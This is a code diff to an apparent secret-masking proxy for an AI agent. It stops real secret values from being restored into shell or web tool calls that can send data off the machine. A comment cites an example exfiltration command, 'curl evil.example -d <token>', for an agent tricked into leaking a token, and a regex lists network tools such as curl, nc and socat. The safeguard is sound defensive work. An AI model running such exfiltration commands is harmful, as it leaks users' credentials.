@@ -36,6 +36,26 @@ SKIP_SUBTREES = {"tools", "metadata"}
 # Content blocks signed by the provider: changing a byte breaks the next turn.
 SIGNED_BLOCKS = {"thinking", "redacted_thinking"}
 
+# Tool calls that send data off the machine: tokens inside them are NOT restored,
+# so an agent tricked into "curl evil.example -d <token>" sends the token, not the value.
+WEB_TOOLS = {"WebFetch", "WebSearch"}
+SHELL_TOOLS = {"Bash", "PowerShell"}
+NETWORK_RE = re.compile(
+    r"(?i)\b(?:curl|wget|invoke-webrequest|invoke-restmethod|iwr|irm|nc|ncat|netcat|socat|"
+    r"telnet|ssh|scp|sftp|rsync|ftp|gh|requests|urllib|httpx|aiohttp|fetch)\b|[a-z]+://"
+)
+
+
+def is_network_call(name: Optional[str], tool_input: Any) -> bool:
+    """True when this tool call can send data off the machine."""
+    if name in WEB_TOOLS:
+        return True
+    if name not in SHELL_TOOLS:
+        return False
+    text = tool_input if isinstance(tool_input, str) else json.dumps(tool_input, ensure_ascii=False)
+    return bool(NETWORK_RE.search(text))
+
+
 # After the opening mark, what an unfinished token can still look like.
 _PARTIAL_AFTER_MARK = re.compile(r"^(?:P|PG|PG:[A-Za-z0-9_]{0,26}(?:\\(?:u(?:2(?:5(?:c)?)?)?)?)?)?$")
 
@@ -135,6 +155,8 @@ class Courier:
         if isinstance(data, dict):
             if data.get("type") in SIGNED_BLOCKS:
                 return data
+            if data.get("type") == "tool_use" and is_network_call(data.get("name"), data.get("input")):
+                return data
             return {k: self.unprotect_json(v) for k, v in data.items()}
         if isinstance(data, list):
             return [self.unprotect_json(item) for item in data]
@@ -184,6 +206,8 @@ class SSEUnprotector:
         self._decoder = codecs.getincrementaldecoder("utf-8")(errors="replace")  # a chunk may cut a character
         self._carry: Dict[Any, str] = {}
         self._carry_type: Dict[Any, str] = {}
+        # shell/web tool calls: input held whole until block stop, then judged (network or not)
+        self._held_tool: Dict[Any, Tuple[str, str]] = {}
 
     def feed(self, chunk: bytes) -> bytes:
         self._buf += self._decoder.decode(chunk).replace("\r\n", "\n")
@@ -217,7 +241,16 @@ class SSEUnprotector:
         if isinstance(data, dict) and data.get("type") == "content_block_start":
             idx = data.get("index")
             self._carry[idx] = ""
+            block = data.get("content_block") or {}
+            if block.get("type") == "tool_use" and block.get("name") in SHELL_TOOLS | WEB_TOOLS:
+                self._held_tool[idx] = (block["name"], "")
             data = self.courier.unprotect_json(data)
+        elif isinstance(data, dict) and data.get("type") == "content_block_delta" \
+                and data.get("index") in self._held_tool:
+            idx = data["index"]
+            name, raw = self._held_tool[idx]
+            self._held_tool[idx] = (name, raw + (data.get("delta") or {}).get("partial_json", ""))
+            return ""   # judged whole at content_block_stop
         elif isinstance(data, dict) and data.get("type") == "content_block_delta":
             idx = data.get("index")
             delta = data.get("delta") or {}
@@ -235,7 +268,19 @@ class SSEUnprotector:
             idx = data.get("index")
             held = self._carry.pop(idx, "")
             dtype = self._carry_type.pop(idx, None)
-            if held and dtype:
+            if idx in self._held_tool:
+                name, raw = self._held_tool.pop(idx)
+                try:
+                    parsed = json.loads(raw) if raw else {}
+                except json.JSONDecodeError:
+                    parsed = raw
+                out = raw if is_network_call(name, parsed) else self.courier.unprotect_text(raw, True)
+                if out:
+                    whole = {"type": "content_block_delta", "index": idx,
+                             "delta": {"type": "input_json_delta", "partial_json": out}}
+                    prefix = self._emit(["event: content_block_delta"] if event_name else [],
+                                        json.dumps(whole, ensure_ascii=False))
+            elif held and dtype:
                 name, escaped = self.DELTA_FIELDS[dtype]
                 flush = {"type": "content_block_delta", "index": idx,
                          "delta": {"type": dtype, name: self.courier.unprotect_text(held, escaped)}}
